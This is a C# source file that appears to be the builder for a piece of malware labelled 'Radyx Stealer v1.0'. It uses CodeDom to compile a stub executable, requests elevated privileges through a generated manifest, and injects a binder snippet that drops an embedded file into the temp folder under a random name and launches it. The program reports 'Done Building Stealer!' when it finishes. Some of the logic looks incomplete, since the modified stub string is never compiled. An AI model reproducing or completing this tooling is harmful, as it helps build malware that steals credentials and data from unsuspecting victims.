﻿using Microsoft.CSharp;
using Radyx;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Policy;
using System.Text;
using System.Windows.Forms;
using Radyx;
using System.IO;
using MetroFramework.Properties;

namespace CodeDomExample
{
    public class Compiler
    {

        public static string icon = "";

        // Read more to learn more...
        // docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/listed-alphabetically
        public Compiler(string sourceCode, string savePath)
        {
            // include your references here

            string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n    <application>\r\n    </application>\r\n  </compatibility>\r\n</assembly>\r\n";
            File.WriteAllText(Application.StartupPath + "\\manifest.manifest", contents);

            string[] referencedAssemblies = new string[] {

          "System.Net.dll",
          "System.dll",
          "System.Windows.Forms.dll",
          "System.Drawing.dll",
          "System.Management.dll",
          "System.IO.dll",
          "System.IO.compression.dll",
          "System.IO.compression.filesystem.dll",
          "System.Core.dll",
          "System.Security.dll",
          "System.Net.Http.dll"
};
          
            // .net framework dependency version
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

            // target = Specifies the format of the output file by using one of four options: -target:appcontainerexe, -target:exe, -target:library, -target:module, -target:winexe, -target:winmdobj.
            // platform = Limits which platforms this code can run on: x86, Itanium, x64, anycpu, or anycpu32bitpreferred. The default is anycpu.
            // optimize = Enables/disables optimizations.
            string compilerOptions = "/target:winexe /platform:x86 /optimize+";

            compilerOptions = compilerOptions + " /win32manifest:\"" + Application.StartupPath + "\\manifest.manifest\"";
            compilerOptions = compilerOptions + " /win32icon:\"" + icon + "\"";

            using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
            {
                CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = savePath, // output path
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false




                };
                string a = Radyx.Properties.Resources.Stub;
                string text3 = "string FileNames = \"%FILENAME1%\";\r\n            string RandomChars = \"trashlol\" + DateTime.Now.Millisecond;\r\n                bool delay = false;\r\n                Directory.SetCurrentDirectory(Path.GetTempPath());\r\n                    ExtractResource(FileNames, RandomChars + FileNames);\r\n                    Process.Start(RandomChars + FileNames);\r\n                \r\n                if (delay == true)\r\n                {\r\n                    Thread.Sleep(30000);\r\n                }\r\n\r\n\r\n                ";
                compilerParameters.EmbeddedResources.Add(Radyx.Properties.Resources.Stub);
                string fileName2 = @"C:\Users\PC\Desktop\proxy.exe";
                text3 = text3.Replace("%FILENAME1%", fileName2);
                MessageBox.Show(text3);
                 a = a.Replace("//bindmethod", text3);

                CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode); // source.cs
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                    }
                    return;
                }
                else
                {
                    MessageBox.Show("Done Building Stealer!","Radyx Stealer v1.0",MessageBoxButtons.OK,MessageBoxIcon.Information);
                    File.Delete(Application.StartupPath + "\\manifest.manifest");
                }
            }
        }
    }
}
